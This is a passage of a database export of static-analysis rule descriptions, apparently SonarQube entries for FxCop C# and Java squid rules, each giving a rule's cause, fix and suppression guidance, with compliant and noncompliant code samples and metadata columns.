{rule:fxcop:DoNotMarkEnumsWithFlags}<br/>\n\n\n\n\n                {rule:fxcop:DoNotNameEnumValuesReserved}<br/>\n\n\n\n\n                {rule:fxcop:DoNotPrefixEnumValuesWithTypeName}<br/>\n\n\n\n\n                {rule:fxcop:EnumStorageShouldBeInt32}<br/>\n\n\n\n\n                {rule:fxcop:MarkEnumsWithFlags}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182149.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182149.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806748	1511453806748	1
315	CA2147: Transparent methods may not use security asserts	SecurityTransparentCodeShouldNotAssert	CA2147	fxcop	<h2>Cause</h2>\n<p>\n            Code that is marked as <code>SecurityTransparentAttribute</code> is not granted sufficient permissions to assert.\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule analyzes all methods and types in an assembly which is either 100% transparent or mixed transparent/critical, and flags any declarative or imperative usage of <code>Assert</code>.\n            At run time, any calls to <code>Assert</code> from transparent code will cause a <code>InvalidOperationException</code> to be thrown. This can occur in both 100% transparent assemblies, and also in mixed transparent/critical assemblies where a method or type is declared transparent, but includes a declarative or imperative Assert.\n            The .NET Framework 2.0 introduced a feature named transparency. Individual methods, fields, interfaces, classes, and types can be either transparent or critical.\n            Transparent code is not allowed to elevate security privileges. Therefore, any permissions granted or demanded of it are automatically passed through the code to the caller or host application domain. Examples of elevations include Asserts, LinkDemands, SuppressUnmanagedCode, and <code>unsafe</code> code.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To resolve the issue, either mark the code which calls the Assert with the <code>SecurityCriticalAttribute</code>, or remove the Assert.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a message from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/bb264482.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264482.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	\N	\N	\N	f	HTML	1511453806749	1511453806750	1
316	CA1716: Identifiers should not match keywords	IdentifiersShouldNotMatchKeywords	CA1716	fxcop	<h2>Cause</h2>\n<p>\n            A name of a namespace, a type, or a viritual or interface member matches a reserved keyword in a programming language.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Identifiers for namespaces, types, and virtual and interface members should not match keywords that are defined by languages that target the common language runtime. Depending on the language that is used and the keyword, compiler errors and ambiguities can make the library difficult to use.\n            This rule checks against keywords in the following languages:\n            <ul>\n              <li>\n                Visual Basic\n              </li>\n              <li>\n                C#\n              </li>\n              <li>\n                C++/CLI\n              </li>\n            </ul>\n            Case-insensitive comparison is used for Visual Basic keywords, and case-sensitive comparison is used for the other languages.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Select a name that does not appear in the list of keywords.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            You can suppress a warning from this rule if you are convinced that the identifier will not confuse users of the API, and that  the library is usable in all available languages in the .NET Framework.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182248.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182248.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	\N	\N	\N	f	HTML	1511453806750	1511453806750	1
317	CA1028: Enum storage should be Int32	EnumStorageShouldBeInt32	CA1028	fxcop	<h2>Cause</h2>\n<p>\n            The underlying type of a public enumeration is not System.Int32.\n</p>\n<h2>Rule Description</h2>\n<p>\n            An enumeration is a value type that defines a set of related named constants. By default, the System.Int32 data type is used to store the constant value. Even though you can change this underlying type, it is not necessary or recommended for most scenarios. Note that no significant performance gain is achieved by using a data type that is smaller than Int32. If you cannot use the default data type, you should use one of the Common Language System (CLS)-compliant integral types, <code>Byte</code>, Int16, Int32, or Int64 to make sure that all values of the enumeration can be represented in CLS-compliant programming languages.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, unless size or compatibility issues exist, use Int32. For situations where Int32 is not large enough to hold the values, use Int64. If backward compatibility requires a smaller data type, use <code>Byte</code> or Int16.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Suppress a warning from this rule only if backward compatibility issues require it. In applications, failure to comply with this rule usually does not cause problems. In libraries, where language interoperability is required, failure to comply with this rule might adversely affect your users.\n</p>\n<h2>Example of a Violation</h2>\n\n<h3>Description</h3>\n<p>\n                The following example shows two enumerations that do not use the recommended underlying data type.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\n\nnamespace DesignLibrary\n{\n   [Flags]\n   public enum Days : uint\n   {\n      None        = 0,\n      Monday      = 1,\n      Tuesday     = 2,\n      Wednesday   = 4,\n      Thursday    = 8,\n      Friday      = 16,\n      All         = Monday| Tuesday | Wednesday | Thursday | Friday\n   }\n\n   public enum Color :sbyte\n   {\n      None        = 0,\n      Red         = 1,\n      Orange      = 3,\n      Yellow      = 4\n   }\n}\n</pre>\n\n\n\n\n\n</p>\n<h2>Example of How to Fix</h2>\n\n<h3>Description</h3>\n<p>\n                The following example fixes the previous violation by changing the underlying data type to Int32.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\n\nnamespace Samples\n{\n    [Flags]\n    public enum Days : int\n    {\n        None        = 0,\n        Monday      = 1,\n        Tuesday     = 2,\n        Wednesday   = 4,\n        Thursday    = 8,\n        Friday      = 16,\n        All         = Monday| Tuesday | Wednesday | Thursday | Friday\n    }\n\n    public enum Color : int\n    {\n        None        = 0,\n        Red         = 1,\n        Orange      = 3,\n        Yellow      = 4\n    }\n}\n</pre>\n\n\n\n\n\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:EnumsShouldHaveZeroValue}<br/>\n\n\n\n\n                {rule:fxcop:MarkEnumsWithFlags}<br/>\n\n\n\n\n                {rule:fxcop:DoNotMarkEnumsWithFlags}<br/>\n\n\n\n\n                {rule:fxcop:DoNotNameEnumValuesReserved}<br/>\n\n\n\n\n                {rule:fxcop:DoNotPrefixEnumValuesWithTypeName}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182147.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182147.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806752	1511453806752	1
484	Classes without "public" constructors should be "final"	S2974	S2974	squid	<p>Classes with only <code>private</code> constructors should be marked <code>final</code> to prevent any mistaken extension attempts.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic class PrivateConstructorClass {  // Noncompliant\n  private PrivateConstructorClass() {\n    // ...\n  }\n\n  public static int magic(){\n    return 42;\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic final class PrivateConstructorClass {  // Compliant\n  private PrivateConstructorClass() {\n    // ...\n  }\n\n  public static int magic(){\n    return 42;\n  }\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	design	f	HTML	1511453807003	1511453807003	1
485	Strings should not be concatenated using '+' in a loop	S1643	S1643	squid	<p>Strings are immutable objects in Java, so concatenation doesn't simply add the new String to the end of the existing string. Instead, in each loop iteration, the first String is converted to an intermediate object type, the second string is appended, and then the intermediate object is converted back to a String. Further, performance of these intermediate operations degrades as the String gets longer. Therefore, the use of StringBuilder is preferred.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nString str = "";\nfor (int i = 0; i < arrayOfStrings.length ; ++i) {\n  str = str + arrayOfStrings[i];\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nStringBuilder bld = new StringBuilder();\nfor (int i = 0; i < arrayOfStrings.length; ++i) {\n  bld.append(arrayOfStrings[i]);\n}\nString str = bld.toString();\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	performance	f	HTML	1511453807003	1511453807004	1
318	CA2145: Transparent methods should not be decorated with the SuppressUnmanagedCodeSecurityAttribute	TransparentMethodsShouldNotUseSuppressUnmanagedCodeSecurity	CA2145	fxcop	<h2>Cause</h2>\n<p>\n            A transparent method, a method that is marked with the <code>SecuritySafeCriticalAttribute</code> method, or a type that contains a method is marked with the <code>SuppressUnmanagedCodeSecurityAttribute</code> attribute.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Methods decorated with the <code>SuppressUnmanagedCodeSecurityAttribute</code> attribute have an implicit LinkDemand placed upon any method that calls it. This LinkDemand requires that the calling code be security critical. Marking the method that uses SuppressUnmanagedCodeSecurity with the <code>SecurityCriticalAttribute</code> attribute makes this requirement more obvious for callers of the method.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, mark the method or type with the <code>SecurityCriticalAttribute</code> attribute.\n</p>\n<h2>When to Suppress Warnings</h2>\n\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\nusing System.Runtime.InteropServices;\nusing System.Security;\n\nnamespace TransparencyWarningsDemo\n{\n\n    public class SafeNativeMethods\n    {\n        // CA2145 violation - transparent method marked SuppressUnmanagedCodeSecurity.  This should be fixed by \n        // marking this method SecurityCritical.\n        [DllImport("kernel32.dll", SetLastError = true)]\n        [SuppressUnmanagedCodeSecurity]\n        [return: MarshalAs(UnmanagedType.Bool)]\n        internal static extern bool Beep(uint dwFreq, uint dwDuration);\n    }\n}\n</pre>\n\n\n\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/dd997570.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd997570.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	\N	\N	\N	f	HTML	1511453806753	1511453806753	1
319	CA1034: Nested types should not be visible	NestedTypesShouldNotBeVisible	CA1034	fxcop	<h2>Cause</h2>\n<p>\n            An externally visible type contains an externally visible type declaration. Nested enumerations and protected types are exempt from this rule.\n</p>\n<h2>Rule Description</h2>\n<p>\n            A nested type is a type declared within the scope of another type. Nested types are useful for encapsulating private implementation details of the containing type. Used for this purpose, nested types should not be externally visible.\n            Do not use externally visible nested types for logical grouping or to avoid name collisions; instead, use namespaces.\n            Nested types include the notion of member accessibility, which some programmers do not understand clearly.\n            Protected types can be used in subclasses and nested types in advance customization scenarios.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            If you do not intend the nested type to be externally visible, change the type's accessibility. Otherwise, remove the nested type from its parent. If the purpose of the nesting is to categorize the nested type, use a namespace to create the hierarchy instead.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182162.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182162.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806755	1511453806755	1
458	Short-circuit logic should be used to prevent null pointer dereferences in conditionals	S1697	S1697	squid	<p>\n  When either the equality operator in a null test or the logical operator that follows it is reversed,\n  the code has the appearance of safely null-testing the object before dereferencing it.\n  Unfortunately the effect is just the opposite - the object is null-tested and then dereferenced\n  <em>only</em> if it is null, leading to a guaranteed null pointer dereference.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (str == null &amp;&amp; str.length() == 0) {\n  System.out.println("String is empty");\n}\n\nif (str != null || str.length() &gt; 0) {\n  System.out.println("String is not empty");\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nif (str == null || str.length() == 0) {\n  System.out.println("String is empty");\n}\n\nif (str != null &amp;&amp; str.length() &gt; 0) {\n  System.out.println("String is not empty");\n}\n</pre>	4	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	\N	f	HTML	1511453806968	1511453806968	2
489	Classes from "sun.*" packages should not be used	S1191	S1191	squid	<p>Classes in the <code>sun.*</code> or <code>com.sun.*</code> packages are considered implementation details, and are not part of the Java API.</p>\n<p>They can cause problems when moving to new versions of Java because there is no backwards compatibility guarantee. Similarly, they can cause problems when moving to a different Java vendor, such as OpenJDK.</p>\n<p>Such classes are almost always wrapped by Java API classes that should be used instead.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nimport com.sun.jna.Native;     // Noncompliant\nimport sun.misc.BASE64Encoder; // Noncompliant\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1h	\N	\N	lock-in,pitfall	f	HTML	1511453807008	1511453807008	1
320	CA2234: Pass System.Uri objects instead of strings	PassSystemUriObjectsInsteadOfStrings	CA2234	fxcop	<h2>Cause</h2>\n<p>\n            A call is made to a method that has a string parameter whose name contains "uri", "Uri", "urn", "Urn", "url", or "Url"; and the declaring type of the method contains a corresponding method overload that has a <code>System.Uri</code> parameter.\n</p>\n<h2>Rule Description</h2>\n<p>\n            A parameter name is split into tokens based on the camel casing convention, and then each token is checked to see whether it equals "uri", "Uri", "urn", "Urn", "url", or "Url". If there is a match, the parameter is assumed to represent a uniform resource identifier (URI). A string representation of a URI is prone to parsing and encoding errors, and can lead to security vulnerabilities. The <code>Uri</code> class provides these services in a safe and secure manner. When there is a choice between two overloads that differ only regarding the representation of a URI, the user should choose the overload that takes a <code>Uri</code> argument.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, call the overload that takes the <code>Uri</code> argument.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if the string parameter does not represent a URI.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:StringUriOverloadsCallSystemUriOverloads}<br/>\n\n\n\n\n                {rule:fxcop:UriPropertiesShouldNotBeStrings}<br/>\n\n\n\n\n                {rule:fxcop:UriParametersShouldNotBeStrings}<br/>\n\n\n\n\n                {rule:fxcop:UriReturnValuesShouldNotBeStrings}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182360.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182360.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806756	1511453806756	1
321	CA1401: P/Invokes should not be visible	PInvokesShouldNotBeVisible	CA1401	fxcop	<h2>Cause</h2>\n<p>\n            A public or protected method in a public type has the <code>System.Runtime.InteropServices.DllImportAttribute</code> attribute (also implemented by the <code>Declare</code> keyword in Visual Basic).\n</p>\n<h2>Rule Description</h2>\n<p>\n            Methods that are marked with the <code>DllImportAttribute</code> attribute (or methods that are defined by using the <code>Declare</code> keyword in Visual Basic) use Platform Invocation Services to access unmanaged code. Such methods should not be exposed. By keeping these methods private or internal, you make sure that your library cannot be used to breach security by allowing callers access to unmanaged APIs that they could not call otherwise.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, change the access level of the method.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182209.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182209.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806757	1511453806758	1
322	CA1036: Override methods on comparable types	OverrideMethodsOnComparableTypes	CA1036	fxcop	<h2>Cause</h2>\n<p>\n            A public or protected type implements the <code>System.IComparable</code> interface and does not override <code>Object.Equals</code> or does not overload the language-specific operator for equality, inequality, less than, or greater than. The rule does not report a violation if the type inherits only an implementation of the interface.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Types that define a custom sort order implement the <code>IComparable</code> interface. The <code>CompareTo</code> method returns an integer value that indicates the correct sort order for two instances of the type. This rule identifies types that set a sort order; this implies that the ordinary meaning of equality, inequality, less than, and greater than do not apply. When you provide an implementation of <code>IComparable</code>, you must usually also override <code>Equals</code> so that it returns values that are consistent with <code>CompareTo</code>. If you override <code>Equals</code> and are coding in a language that supports operator overloads, you should also provide operators that are consistent with <code>Equals</code>.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, override <code>Equals</code>. If your programming language supports operator overloading, supply the following operators:\n            <ul>\n              <li>\n                op_Equality\n              </li>\n              <li>\n                op_Inequality\n              </li>\n              <li>\n                op_LessThan\n              </li>\n              <li>\n                op_GreaterThan\n              </li>\n            </ul>\n            In C#, the tokens that are used to represent these operators are as follows: ==, !=, &lt;, and &gt;.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule when the violation is caused by missing operators and your programming language does not support operator overloading, as is the case with Visual Basic .NET. It is also safe to suppress a warning for from this rule when it fires on equality operators other than op_Equality if you determine that implementing the operators does not make sense in your application context. However, you should always over op_Equality and the == operator if you override Object.Equals.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182163.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182163.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806758	1511453806759	1
518	The @SuppressWarnings annotation should not be used	S1309	S1309	squid	<p>This rule allows you to track the usage of the <code>@SuppressWarnings</code> mechanism.</p>\n<h2>Noncompliant Code Example</h2>\n<p>In case &quot;listOfWarnings=unchecked&quot;</p>\n<pre>\n@SuppressWarnings("all")\n</pre>\n<h2>Compliant Solution</h2>\n<p>In case &quot;listOfWarnings=unchecked&quot;</p>\n<pre>\n@SuppressWarnings("unchecked")\n</pre>	0	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	\N	f	HTML	1511453807046	1511453807046	1
323	CA2003: Do not treat fibers as threads	DoNotTreatFibersAsThreads	CA2003	fxcop	<h2>Cause</h2>\n<p>\n            A managed thread is being treated as a Win32 thread.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Do not assume a managed thread is a Win32 thread. It is a fiber. The common language runtime (CLR) will run managed threads as fibers in the context of real threads that are owned by SQL. These threads can be shared across AppDomains and even databases in the SQL Server process. Using managed thread local storage will work, but you may not use unmanaged thread local storage or assume that your code will run on the current OS thread again. Do not change settings such as the locale of the thread. Do not call CreateCriticalSection or CreateMutex via P/Invoke because they require that the thread that enters a lock must also exit the lock. Because this will not be the case when you use fibers, Win32 critical sections and mutexes will be useless in SQL. You may safely use most of the state on a managed System.Thread object. This includes managed thread local storage and the current user interface (UI) culture of the thread. However, for programming model reasons, you will not be able to change the current culture of a thread when you  use SQL; this will be enforced through a new permission.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Examine your usage of threads and change your code accordingly.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            You should not suppress this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182291.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182291.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	20min	\N	\N	\N	\N	\N	f	HTML	1511453806759	1511453806760	1
324	CA1001: Types that own disposable fields should be disposable	TypesThatOwnDisposableFieldsShouldBeDisposable	CA1001	fxcop	<h2>Cause</h2>\n<p>\n            A class declares and implements an instance field that is a <code>System.IDisposable</code> type and the class does not implement <code>IDisposable</code>.\n</p>\n<h2>Rule Description</h2>\n<p>\n            A class implements the <code>IDisposable</code> interface to dispose of unmanaged resources that it owns. An instance field that is an <code>IDisposable</code> type indicates that the field owns an unmanaged resource. A class that declares an <code>IDisposable</code> field indirectly owns an unmanaged resource and should implement the <code>IDisposable</code> interface. If the class does not directly own any unmanaged resources, it should not implement a finalizer.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, implement <code>IDisposable</code> and from the <code>IDisposable.Dispose</code> method call the <code>Dispose</code> method of the field.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:DisposableFieldsShouldBeDisposed}<br/>\n\n\n\n\n                {rule:fxcop:DisposableTypesShouldDeclareFinalizer}<br/>\n\n\n\n\n                {rule:fxcop:DisposeMethodsShouldCallBaseClassDispose}<br/>\n\n\n\n\n                {rule:fxcop:TypesThatOwnNativeResourcesShouldBeDisposable}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182172.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182172.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806761	1511453806761	1
463	Throws declarations should not be superfluous	RedundantThrowsDeclarationCheck	RedundantThrowsDeclarationCheck	squid	<p>\nAn exception in a <code>throws</code> declaration in Java is superfluous if it is:\n</p>\n\n<ul>\n  <li>listed multiple times</li>\n  <li>a subclass of another listed exception</li>\n  <li>a <code>RuntimeException</code>, or one of its descendants</li>\n  <li>completely unnecessary because the declared exception type cannot actually be thrown</li>\n</ul>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nvoid foo() throws MyException, MyException {}  // Noncompliant; should be listed once\nvoid bar() throws Throwable, Exception {}  // Noncompliant; Exception is a subclass of Throwable\nvoid baz() throws RuntimeException {}  // Noncompliant; RuntimeException can always be thrown\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\nvoid foo() throws MyException {}\nvoid bar() throws Throwable {}\nvoid baz() {}\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	clumsy,unused	f	HTML	1511453806973	1511453806973	1
464	The diamond operator ("<>") should be used	S2293	S2293	squid	<p>Java 7 introduced the diamond operator (<code>&lt;&gt;</code>) to reduce the verbosity of generics code. For instance, instead of having to declare a <code>List</code>'s type in both its declaration and its constructor, you can now simplify the constructor declaration with <code>&lt;&gt;</code>, and the compiler will infer the type.</p>\n\n<p>\n  <strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>7</code>.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nList&lt;String&gt; strings = new ArrayList&lt;String&gt;();  // Noncompliant\nMap&lt;String,List&lt;Integer&gt;&gt; map = new HashMap&lt;String,List&lt;Integer&gt;&gt;();  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nList&lt;String&gt; strings = new ArrayList&lt;&gt;();\nMap&lt;String,List&lt;Integer&gt;&gt; map = new HashMap&lt;&gt;();\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	clumsy	f	HTML	1511453806974	1511453806976	1
325	CA1006: Do not nest generic types in member signatures	DoNotNestGenericTypesInMemberSignatures	CA1006	fxcop	<h2>Cause</h2>\n<p>\n            An externally visible member has a signature that contains a nested type argument.\n</p>\n<h2>Rule Description</h2>\n<p>\n            A nested type argument is a type argument that is also a generic type. To call a member whose signature contains a nested type argument, the user must instantiate one generic type and pass this type to the constructor of a second generic type. The required procedure and syntax are complex and should be avoided.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, change the design to remove the nested type argument.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule. Providing generics in a syntax that is easy to understand and use reduces the time that is required to learn and increases the adoption rate of new libraries.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:AvoidExcessiveParametersOnGenericTypes}<br/>\n\n\n\n\n                {rule:fxcop:CollectionsShouldImplementGenericInterface}<br/>\n\n\n\n\n                {rule:fxcop:DoNotDeclareStaticMembersOnGenericTypes}<br/>\n\n\n\n\n                {rule:fxcop:DoNotExposeGenericLists}<br/>\n\n\n\n\n                {rule:fxcop:GenericMethodsShouldProvideTypeParameter}<br/>\n\n\n\n\n                {rule:fxcop:UseGenericEventHandlerInstances}<br/>\n\n\n\n\n                {rule:fxcop:UseGenericsWhereAppropriate}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182144.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182144.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	1h	\N	\N	\N	\N	\N	f	HTML	1511453806762	1511453806762	1
326	CA1044: Properties should not be write only	PropertiesShouldNotBeWriteOnly	CA1044	fxcop	<h2>Cause</h2>\n<p>\n            The public or protected property has a set accessor but does not have a get accessor.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Get accessors provide read access to a property and set accessors provide write access. Although it is acceptable and often necessary to have a read-only property, the design guidelines prohibit the use of write-only properties. This is because letting a user set a value and then preventing the user from viewing the value does not provide any security. Also, without read access, the state of shared objects cannot be viewed, which limits their usefulness.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, add a get accessor to the property. Alternatively, if the behavior of a write-only property is necessary, consider converting this property to a method.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is strongly recommended that you do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182165.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182165.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806763	1511453806763	1
327	CA1701: Resource string compound words should be cased correctly	ResourceStringCompoundWordsShouldBeCasedCorrectly	CA1701	fxcop	<h2>Cause</h2>\n<p>\n            A resource string contains a compound word that does not appear to be cased correctly.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Each word in the resource string is split into tokens that are based on the casing. Each contiguous two-token combination is checked by the Microsoft spelling checker library. If recognized, the word produces a violation of the rule. Examples of compound words that cause a violation are "CheckSum" and "MultiPart", which should be cased as "Checksum" and "Multipart", respectively. Due to previous common usage, several exceptions are built into the rule, and several single words are flagged, such as "Toolbar" and "Filename", that should be cased as two distinct words. In this example, "ToolBar" and "FileName" would be flagged.\n            Naming conventions provide a common look for libraries that target the common language runtime. This reduces the learning curve that is required for new software libraries, and increases customer confidence that the library was developed by someone who has expertise in developing managed code.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Change the word so that it is cased correctly.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if both parts of the compound word are recognized by the spelling dictionary and the intent is to use two words.\n            You can also add compound words to a custom dictionary for the spelling checker. Words in the custom dictionary do not cause violations. For more information, see How to: Customize the Code Analysis Dictionary.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                CA1702: Compound words should be cased correctly\n\n\n\n\n                {rule:fxcop:IdentifiersShouldBeCasedCorrectly}<br/>\n\n\n\n\n                {rule:fxcop:IdentifiersShouldDifferByMoreThanCase}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/bb264481.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264481.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	\N	\N	\N	f	HTML	1511453806764	1511453806764	1
328	CA2122: Do not indirectly expose methods with link demands	DoNotIndirectlyExposeMethodsWithLinkDemands	CA2122	fxcop	<h2>Cause</h2>\n<p>\n            A public or protected member has a Link Demands and is called by a member that does not perform any security checks.\n</p>\n<h2>Rule Description</h2>\n<p>\n            A link demand checks the permissions of the immediate caller only. If a member X makes no security demands of its callers, and calls code protected by a link demand, a caller without the necessary permission can use X to access the protected member.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Add a security <code>Data and Modeling in the .NET Framework</code> or link demand to the member so that it no longer provides unsecured access to the link demand-protected member.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            To safely suppress a warning from this rule, you must make sure that your code does not grant its callers access to operations or resources that can be used in a destructive manner.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182303.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182303.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	1h	\N	\N	\N	\N	\N	f	HTML	1511453806766	1511453806766	1
